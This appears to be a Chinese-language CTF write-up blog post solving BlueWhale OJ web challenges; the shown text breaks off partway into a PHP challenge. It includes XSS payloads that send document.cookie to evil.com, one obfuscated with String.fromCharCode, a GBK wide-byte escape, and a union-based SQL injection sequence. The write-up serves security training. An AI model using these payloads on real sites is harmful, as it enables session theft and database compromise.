<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="BlueWhale OpenJudge Web Challenge WriteUp Part 1. Including &quot;Welcome to web&quot;, &quot;Calculator&quot;, &quot;RapidTyping&quot;, &quot;XSS1&quot;, &quot;XSS 2&quot;, &quot;Basic SQL&quot;, &quot;Basic PHP&quot;, &quot;Basic PHP 2&quot;, &quot;BabyXSS&quot;, &quot;BasicFileInclude&quot;, &quot;Fxx">
<meta property="og:type" content="article">
<meta property="og:title" content="BlueWhale OJ Web WriteUp Part 1">
<meta property="og:url" content="https://srpopty.github.io/2020/08/05/BlueWhaleOJ-Web-WriteUp-Part1/index.html">
<meta property="og:site_name" content="Shadow Gallery">
<meta property="og:description" content="BlueWhale OpenJudge Web Challenge WriteUp Part 1. Including &quot;Welcome to web&quot;, &quot;Calculator&quot;, &quot;RapidTyping&quot;, &quot;XSS1&quot;, &quot;XSS 2&quot;, &quot;Basic SQL&quot;, &quot;Basic PHP&quot;, &quot;Basic PHP 2&quot;, &quot;BabyXSS&quot;, &quot;BasicFileInclude&quot;, &quot;Fxx">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-08-05T09:22:10.000Z">
<meta property="article:modified_time" content="2020-08-05T09:22:10.000Z">
<meta property="article:author" content="Srpopty">
<meta property="article:tag" content="BlueWhale">
<meta property="article:tag" content="WriteUp">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://srpopty.github.io/2020/08/05/BlueWhaleOJ-Web-WriteUp-Part1/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true
  };
</script>

  <title>BlueWhale OJ Web WriteUp Part 1 | Shadow Gallery</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Shadow Gallery" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Shadow Gallery</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">Live in the shadow</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-knowledge">

    <a href="/knowledge/" rel="section"><i class="fa fa-fw fa-book"></i>知识库</a>

  </li>
        <li class="menu-item menu-item-life">

    <a href="/life/" rel="section"><i class="fa fa-fw fa-rocket"></i>随想</a>

  </li>
        <li class="menu-item menu-item-ctf">

    <a href="/ctf/" rel="section"><i class="fa fa-fw fa-flag"></i>ctf</a>

  </li>
        <li class="menu-item menu-item-vulnerabilities">

    <a href="/vulnerabilities/" rel="section"><i class="fa fa-fw fa-eye"></i>漏洞</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>

</nav>
  <div class="site-search">
    <div class="search-pop-overlay">
  <div class="popup search-popup">
      <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

  </div>
</div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://srpopty.github.io/2020/08/05/BlueWhaleOJ-Web-WriteUp-Part1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Srpopty">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shadow Gallery">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          BlueWhale OJ Web WriteUp Part 1
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-08-05 17:22:10" itemprop="dateCreated datePublished" datetime="2020-08-05T17:22:10+08:00">2020-08-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <div class="post-description">BlueWhale OpenJudge Web Challenge WriteUp Part 1. Including "Welcome to web", "Calculator", "RapidTyping", "XSS1", "XSS 2", "Basic SQL", "Basic PHP", "Basic PHP 2", "BabyXSS", "BasicFileInclude", "FxxkingBackdoor", "Global Page", "BabyCrack", "Baby Reverse", "Confused question", "ZipCracker".</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="Welcome-to-web-5"><a href="#Welcome-to-web-5" class="headerlink" title="Welcome to web(5)"></a>Welcome to web(5)</h1><p>Web 签到题，进入 php0 给一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>] == <span class="string">&#x27;areyousure&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;For this exercise, flag is: ******&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提交 GET 参数 key，值为 areyousure，就可以得到 flag：<code>flag&#123;We1C0me_to_W3b&#125;</code></p>
<h1 id="Calculator-25"><a href="#Calculator-25" class="headerlink" title="Calculator(25)"></a>Calculator(25)</h1><p>给了一道简单的计算题，但是数字很大，要在 1.5 秒内算出来，手算根本不可能，这时候就需要借助脚本的帮助。<br>后端的逻辑是用户第一次访问的时候给一道计算题，这时候生成一个 session，服务器凭借这个 session 来判断用户时候已经领取过一个计算题，如果已经领取过就接受用户的答案。<br>可以用 Python 在第一次 GET 获取计算表达式以后保存 session，然后再用这个 session 把答案发过去，可以用正则表达式提取第一次 Get 获取的网页中的计算表达式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23331/calculator/&#x27;</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">ret = sess.get(url).content</span><br><span class="line">exp = re.findall(<span class="string">r&#x27;&lt;span id=&quot;exp&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>, ret)[<span class="number">0</span>]</span><br><span class="line">ans = <span class="built_in">str</span>(<span class="built_in">eval</span>(exp.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> exp + ans</span><br><span class="line"><span class="built_in">print</span> sess.get(url + <span class="string">&#x27;?answer=&#x27;</span> + ans).content</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以用 JavaScript 直接再网页上操作计算答案然后再自动提交，不过手速要快一点</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;answer&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>=<span class="built_in">eval</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;exp&#x27;</span>).<span class="property">innerText</span>.<span class="title function_">replace</span>(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].<span class="title function_">submit</span>();</span><br></pre></td></tr></table></figure>

<p>答案正确并且在 1.5 秒内提交即可获取 flag：<code>flag&#123;yes_you_are_calculat0r&#125;</code></p>
<h1 id="RapidTyping-50"><a href="#RapidTyping-50" class="headerlink" title="RapidTyping(50)"></a>RapidTyping(50)</h1><p>和 Calculater 差不多的套路，给一个很长的图片验证码，要求在 2.5 秒内输入，手工输入肯定是不可能的，查看网页源码可以发现验证码图片使用的是 svg+xml，那么就代表所有的验证码都是直接用 svg 绘制的，并且验证码的字符就在网页上，svg 的绘制内容采用 base64 编码，解码出以后再用正则表达式获取所有的验证码，需要注意的就是验证码是由顺序的，这个顺序要按照 x 的坐标顺序排列。</p>
<p>和 Calculater 一样，先 Get 获取验证码以后解出验证码在用同一个 session 发过去，可以用正则表达式提取 svg 的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://vps1.blue-whale.me:23331/captcha/&#x27;</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">svg = base64.b64decode(</span><br><span class="line">    re.findall(<span class="string">r&#x27;&lt;img src=&quot;data:image/svg\+xml;base64,(.*?)&quot; /&gt;&#x27;</span>,</span><br><span class="line">               sess.get(url).content)[<span class="number">0</span>]</span><br><span class="line">)</span><br><span class="line">captchas = &#123;</span><br><span class="line">    <span class="built_in">int</span>(item[<span class="number">0</span>]): item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> re.findall(</span><br><span class="line">        <span class="string">r&#x27;&lt;text x=&quot;(\d+)&quot; y=&quot;\d+&quot; style=&quot;fill: rgb\(\d+, \d+, \d+\);&quot;&gt;(\w)&lt;/text&gt;&#x27;</span>, svg</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">captcha = <span class="string">&#x27;&#x27;</span>.join([captchas[x] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">sorted</span>(captchas.keys())])</span><br><span class="line"><span class="built_in">print</span> sess.get(url + <span class="string">&#x27;?code=&#x27;</span>+captcha).content</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以用 Javascript，不过手速要快一点</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">svg = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">svg.<span class="property">innerHTML</span> = <span class="title function_">atob</span>(<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;img&#x27;</span>)[<span class="number">0</span>].<span class="property">src</span>.<span class="title function_">substr</span>(<span class="number">26</span>));</span><br><span class="line">captcha = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">text = <span class="title class_">Array</span>.<span class="title function_">from</span>(svg.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;svg&#x27;</span>)[<span class="number">0</span>].<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;text&#x27;</span>)).<span class="title function_">sort</span>(</span><br><span class="line">        <span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">parseInt</span>(a.<span class="title function_">getAttribute</span>(<span class="string">&#x27;x&#x27;</span>))-<span class="built_in">parseInt</span>(b.<span class="title function_">getAttribute</span>(<span class="string">&#x27;x&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    ).<span class="title function_">forEach</span>(</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">        captcha += item.<span class="property">innerHTML</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;code&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span> = captcha;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].<span class="title function_">submit</span>();</span><br></pre></td></tr></table></figure>

<p>答案正确并且在 2.5 秒内解出即可获得 flag：<code>flag&#123;svg_C4P7cHa_n0t_$ecUr3&#125;</code></p>
<h1 id="XSS1-75"><a href="#XSS1-75" class="headerlink" title="XSS1(75)"></a>XSS1(75)</h1><p>基本的 XSS，源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>);</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>);</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>);</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;svg&gt;&lt;script&gt;var a=\&quot;&quot;</span>. <span class="variable">$text</span> . <span class="string">&quot;\&quot;&lt;/script&gt;&lt;/svg&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>过滤了双引号，尖括号和换行符，但是可以看到最后输出的位置是在 svg 的标签里，所以可以利用 svg 标签可以解析 HTMl 实体的特性完成注入。</p>
<p>测试 payload 如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;amp;quot;;<span class="title function_">alert</span>(<span class="number">123</span>);<span class="keyword">var</span> b=&amp;amp;quot;</span><br></pre></td></tr></table></figure>

<p>先用 <code>&amp;amp;quot;</code> 闭合前面的双引号再加上 <code>;</code> 结束语句，后面就可以执行任意 javascript 代码了，最后再用一个 <code>&amp;amp;quot;</code> 闭合后面的双引号，或者也可以直接注释掉后面的双引号。</p>
<p>题目要求是拿到管理员的 cookie，payload 如下，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;amp;quot;;img=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);img.<span class="property">src</span>=<span class="string">&#x27;http://evil.com/xss/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;form&#x27;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(img);<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>记得在输入的时候用 url 编码一下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%26quot%3B%3Bimg%3Ddocument.createElement%28%27img%27%29%3Bimg.src%3D%27http%3A%2F%2Fevil.com%2Fxss%2F%3Fcookie%3D%27%2Bescape%28document.cookie%29%3Bdocument.getElementsByTagName%28%27form%27%29%5B0%5D.appendChild%28img%29%3B%2F%2F</span><br></pre></td></tr></table></figure>

<p>最后从 cookie 里获取 flag：<code>flag&#123;Br0wseR_F3atUre&#125;</code></p>
<h1 id="XSS-2-75"><a href="#XSS-2-75" class="headerlink" title="XSS 2(75)"></a>XSS 2(75)</h1><p>这次没有直接给源码，输出的引号前面会被加上反斜杠转义，但是查看网页源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Wired filter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;GBK&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Wired filter<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> a=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">autofocus</span>=<span class="string">&quot;autofocus&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到输出的网页上采用了 GBK 编码，可以用宽字节注入。测试 payload 为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%fa%<span class="number">22</span>;<span class="title function_">alert</span>(<span class="number">1</span>);<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>在双字节编码中，前面的 %fa 加上反斜杠可以构成汉字“鶿”的编码，这样后面的双引号 %22 就可以成功逃逸，其他的引号可以使用 <code>String.fromCharCode</code> 绕过。</p>
<p>窃取 cookie 的 payload 如下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%fa%22;img=document.createElement(String.fromCharCode(105,109,103));img.src=String.fromCharCode(104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,47,120,115,115,47,63,99,111,111,107,105,101,45)%2bescape%28document.cookie%29;document.getElementsByTagName(String.fromCharCode(98,111,100,121))[0].appendChild(img);//</span><br></pre></td></tr></table></figure>

<p>最后获得 flag 为：<code>flag&#123;GbK_is_3V1L&#125;</code></p>
<h1 id="Basic-SQL-75"><a href="#Basic-SQL-75" class="headerlink" title="Basic SQL(75)"></a>Basic SQL(75)</h1><p>最基础的 SQL 注入，可以用 SQLmap 直接扫或者手工注入。首选用 payload<code>&#39; or &#39;1&#39;=&#39;1</code>发现可以获取所有新闻，推测查询语句为：<code>select * from news where search like &#39;&#123;$_POST[&quot;search&quot;]&#125;&#39;;</code></p>
<p>获取查询出的列数：<code>a&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3</code></p>
<p>获取所有数据库：<code>a&#39; union select &#39;1&#39;,(select group_concat(SCHEMA_NAME) from information_schema.schemata),&#39;3</code></p>
<p>获取当前数据库名：<code>a&#39; union select &#39;1&#39;,database(),&#39;3</code></p>
<p>获取当前数据库的所有表名：<code>a&#39; union select &#39;1&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#39;3</code></p>
<p>获取字段名：<code>a&#39; union select &#39;1&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;f1agfl4gher3&#39;),&#39;3</code></p>
<p>获取 flag：<code>a&#39; union select &#39;1&#39;,(select h3r31sfl4g from f1agfl4gher3),&#39;3</code></p>
<p>最后得到 flag 为：<code>flag&#123;sql_information_schema_hack&#125;</code></p>
<h1 id="Basic-PHP-75"><a href="#Basic-PHP-75" class="headerlink" title="Basic PHP(75)"></a>Basic PHP(75)</h1><p>直接给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// ========== Stage 1 ========== </span></span><br><span class="line">    <span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]; </span><br><span class="line">    <span class="variable">$test</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$test</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">&#x27;0&#x27;</span>) &#123; </span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;You passed stage 1.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Game over at stage 1.&quot;</span>; </span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ========== Stage 2 ========== </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Your password can not be your name.&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span 